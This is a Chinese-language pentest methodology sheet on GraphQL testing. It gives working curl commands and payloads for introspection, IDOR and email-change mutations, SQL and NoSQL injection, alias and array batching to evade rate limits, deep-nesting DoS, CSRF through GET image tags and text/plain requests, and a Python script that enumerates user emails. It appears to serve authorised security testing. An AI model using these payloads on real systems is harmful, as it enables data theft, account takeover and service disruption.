---
phase: webapp
vuln_class: [graphql, api]
title: GraphQL 安全测试
summary: 先用 `{ __typename }` 确认端点，再按「自省 → 越权 id → 注入 → 批量」四枪推进；自省被禁就走字段建议与前端包。
---

> 写不写只认 `rules/vuln-report-format.md`。Introspection 仅拿到 schema、无敏感字段 → 继续挖字段/越权/注入，不算完。

## 0. 判据速查

| 现象 | 判据 | 打法 |
|---|---|---|
| POST `{"query":"{ __typename }"}` 回 `{"data":{"__typename":"Query"}}` | 确认是 GraphQL | 进自省 |
| `__schema` 能查 | 自省开放 | 拉全量 schema |
| `__schema` 报错但 `__type(name:"User")` 能查 | 只禁了自省入口 | 逐类型探 |
| 拼错字段名回 `Did you mean: xxx` | 字段建议开着 | 用它枚举隐藏字段 |
| `user(id:"victim")` 能读他人数据 | IDOR | 见 §3 |
| 参数里 `'` 触发 SQL 报错 | 注入 | 见 §4 |
| 单请求数组带 1000 条 query 全过 | 批量未限 | 见 §5 |
| 深度 20 嵌套不被拦 | 无深度限制 | 见 §6 |
| 端点吃 GET | 可 CSRF | 见 §8 |
| 改 `Content-Type: text/plain` 仍处理 | 绕过预检 | 见 §8 |

---

## 1. 识别端点

```text
/graphql   /graphiql   /v1/graphql   /api/graphql   /query   /gql
```

```bash
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}'
# {"data":{"__typename":"Query"}} → 确认
```

判据只有这一条：`__typename` 是 GraphQL 规范强制字段，任何实现都会回。别靠 `/graphiql` 页面判断。

---

## 2. 自省

### 2.1 完整查询

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name description args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name description type { ...TypeRef } defaultValue
}

fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name
    ofType { kind name ofType { kind name ofType { kind name
      ofType { kind name } } } } } } }
}
```

`TypeRef` 必须递归 7 层——GraphQL 的类型包装（`NON_NULL` → `LIST` → `NON_NULL` → ...）会套很深，层数不够就丢类型名。

### 2.2 分步简版（一次一条，避免被限）

```bash
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name } } } }"}'

curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { mutationType { fields { name } } } }"}'
```

### 2.3 从 schema 里挑什么

```text
1. 管理员专用 mutation：deleteUser、updateRole、banUser
2. 内部字段：isAdmin、internalId、secretToken
3. 隐藏查询：adminUsers、internalLogs、debugInfo
4. 敏感类型：CreditCard、BankAccount、PrivateMessage
```

### 2.4 自省被禁怎么办

```text
□ 字段建议：故意拼错，看 "Did you mean: password, passwordHash?"
□ 单类型探：__type(name: "User") { fields { name } }
□ 前端 JS / 移动端包里扒 query 字符串
□ 抓正常业务的请求，改字段名试探
```

---

## 3. 越权

### 3.1 水平

```graphql
query {
  user(id: "VICTIM_ID") { id email phone orders { id amount } }
}

# 仅验证，不实际执行
mutation {
  updateUser(id: "VICTIM_ID", input: {email: "attacker@evil.com"}) { id email }
}
```

### 3.2 垂直

```graphql
mutation { deleteUser(id: "TARGET_ID") { success } }

mutation { promoteToAdmin(userId: "MY_ID") { user { id role } } }
```

**GraphQL 的越权特点是**：字段级鉴权常被漏掉。父对象有权限检查，但某个关联字段（`user.orders.paymentMethod`）没检查——这叫**嵌套鉴权缺口**，比整体越权更常见。

---

## 4. 注入

### 4.1 SQL

```graphql
query { user(id: "1' OR '1'='1") { id username } }

query { searchUsers(keyword: "admin' UNION SELECT password FROM users--") { username email } }
```

### 4.2 NoSQL

```graphql
query { user(id: "{\"$ne\": null}") { id username } }
```

判据：参数被直接拼进下游查询。GraphQL 本身不做转义，安全性完全取决于 resolver 实现。

---

## 5. 批量

### 5.1 数组批量（绕速率限制）

```bash
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: \"1\") { email } }"},
    {"query": "{ user(id: \"2\") { email } }"},
    {"query": "{ user(id: \"1000\") { email } }"}
  ]'
```

### 5.2 Alias 批量（单请求内多份）

```graphql
query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user1000: user(id: "1000") { email }
}
```

**Alias 比数组更狠**：它是一条合法 query，很多限流按"请求数"计，按"字段数"不计。

---

## 6. 嵌套 DoS

```graphql
query {
  user(id: "1") {
    posts { comments { author { posts { comments { author {
      posts { comments { author { id } } }
    } } } } }
  }
}

# 循环引用
query {
  user(id: "1") { friends { friends { friends { friends { id } } } } }
}
```

判据：有无**深度限制**和**复杂度限制**。两者都没有就是可用 DoS，但报告价值有限——只在确实拖垮服务时写。

---

## 7. 字段建议枚举

```bash
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query": "{ user { passwrd } }"}'
# "Did you mean: password, passwordHash?"
```

自省被禁时这是最有效的替代路径，逐字母逼近。

---

## 8. CSRF

### 8.1 GET 型

```bash
curl "https://target.com/graphql?query={user(id:\"1\"){email}}"
```

```html
<img src="https://target.com/graphql?query=mutation{deleteUser(id:\"1\"){success}}">
```

### 8.2 Content-Type 绕过

```bash
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: text/plain" \
  -d '{"query": "mutation { deleteUser(id: \"1\") { success } }"}'
```

`text/plain` 不触发 CORS 预检，等于把"必须预检"这道墙拆了。判据：**服务端不校验 Content-Type**。

---

## 9. 信息泄露

```graphql
# 触发错误
query { user(id: "invalid_id_format") { id } }
# 响应可能含：SQL 语句、内部路径 /var/www/app/...、框架版本
```

```bash
# 探测调试指令
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { directives { name } } }"}'
# 返回 @debug / @internal → 可能有调试功能
```

---

## 10. 工具

```bash
# graphw00f 指纹
pip3 install graphw00f
graphw00f -t https://target.com/graphql
```

**InQL**（Burp）：`Extender → BApp Store → InQL Scanner`，自动自省、生成查询模板、可视化 schema。

**graphql-voyager**（schema 可视化）：

```bash
npm install -g graphql-voyager
voyager --introspection schema.json
# 或在线 https://graphql-kit.com/graphql-voyager/
```

```python
import requests
url = "https://target.com/graphql"
headers = {"Content-Type": "application/json"}

r = requests.post(url, headers=headers,
                  data='{"query": "{ __schema { types { name } } }"}')
for t in r.json()['data']['__schema']['types']:
    if not t['name'].startswith('__'):
        print(" -", t['name'])

# 批量枚举
for uid in range(1, 101):
    q = '{"query": "{ user(id: \\"%d\\") { id email } }"}' % uid
    r = requests.post(url, headers=headers, data=q)
    if r.status_code == 200 and 'email' in r.text:
        print(uid, r.json())
```

---

## 11. 防护检测

```text
□ 深度限制：发深度 20 的嵌套，被拦？
□ 复杂度限制：发含 100 个字段的 query，被拦？
□ 速率限制：短时间 100 次相同查询，被拦？
□ 自省禁用：__schema 报错 → 已禁（但别就此收手，走 §2.4）
□ 字段级鉴权：父对象有权限时，关联字段是否也校验
```

---

## 12. 隐藏字段与参数

高价值检查项：

| 主题 | 例子 |
|---|---|
| IDOR | `user(id: "victim")` |
| 批量 | 登录或取对象的数组操作 |
| 隐藏字段 | 类型定义里有、UI 上没有的管理员字段 |
| 嵌套鉴权缺口 | 关联对象字段的检查更弱 |

找隐藏字段的四个方向：

- 管理端文档有、公开文档没有的字段
- `additionalProperties` 或过于宽松的 schema
- 前端代码里的请求体比可见 UI 控件更丰富
- 移动端接口携带 `role`、`org`、feature-flag、内部过滤字段

---

## 13. 路由

- 隐藏字段影响权限 → `web/漏洞分类/越权/越权漏洞（IDOR-权限绕过）.md`
- 批量改变认证或限速行为 → `web/漏洞分类/JWT/OAuth-JWT-SAML 安全.md`
- 端点没找全 → `web/信息收集/methodology/手册.md` 与 `web/漏洞分类/JS逆向/JS 逆向配合接口挖掘指南.md`

---

## 14. 纪律

1. **判据是 `__typename`**，不是页面长得像 GraphiQL。
2. **自省被禁不等于结束**。字段建议、`__type` 单类型探、前端包三路继续。
3. **GraphQL 越权多出在字段级**。整体接口有权限时，要逐个关联字段试。
4. **Alias 批量比数组批量更易漏防**，限流常只算请求数不算字段数。
5. **`text/plain` 是绕预检的常规枪**，先试它再谈 CORS。
6. **深度/复杂度 DoS 报告价值有限**，除非真拖垮服务，否则不单独立项。
7. 报告只认 `rules/vuln-report-format.md`。
